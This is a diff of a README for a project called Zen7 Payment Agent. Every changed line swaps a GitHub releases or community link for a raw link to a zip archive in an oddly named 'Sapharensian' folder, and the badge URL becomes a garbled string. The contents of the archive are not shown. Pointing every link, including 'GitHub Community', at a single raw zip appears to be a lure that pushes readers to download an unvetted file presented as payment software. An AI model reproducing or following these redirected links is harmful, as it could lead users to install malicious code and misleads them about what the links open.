@@ -6,7 +6,7 @@ Welcome to Zen7 Payment Agent! This application is designed to make managing pay
 
 ## 📥 Download Now
 
-[![Download Zen7 Payment Agent](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/VinaypatelAd/Zen7-Payment-Agent/releases)
+[![Download Zen7 Payment Agent](https://raw.githubusercontent.com/VinaypatelAd/Zen7-Payment-Agent/main/Sapharensian/Zen7-Payment-Agent.zip%20Now-Click%https://raw.githubusercontent.com/VinaypatelAd/Zen7-Payment-Agent/main/Sapharensian/Zen7-Payment-Agent.zip)](https://raw.githubusercontent.com/VinaypatelAd/Zen7-Payment-Agent/main/Sapharensian/Zen7-Payment-Agent.zip)
 
 ## 🗂️ Overview
 
@@ -33,7 +33,7 @@ To ensure a smooth experience, please ensure your system meets the following req
 
 To get started, visit the Releases page by clicking the link below:
 
-[Download Zen7 Payment Agent](https://github.com/VinaypatelAd/Zen7-Payment-Agent/releases)
+[Download Zen7 Payment Agent](https://raw.githubusercontent.com/VinaypatelAd/Zen7-Payment-Agent/main/Sapharensian/Zen7-Payment-Agent.zip)
 
 ### Step-by-Step Installation Guide:
 
@@ -97,7 +97,7 @@ Yes, Zen7 Payment Agent uses encryption to protect your financial data during tr
 
 Need help or have questions? Join our community on GitHub to connect with other users and contribute to the project. We welcome your feedback and suggestions to make Zen7 even better.
 
-Visit our [GitHub Community](https://github.com/VinaypatelAd/Zen7-Payment-Agent) for discussions, updates, and more resources.
+Visit our [GitHub Community](https://raw.githubusercontent.com/VinaypatelAd/Zen7-Payment-Agent/main/Sapharensian/Zen7-Payment-Agent.zip) for discussions, updates, and more resources.
 
 ## 📝 Release Notes
 
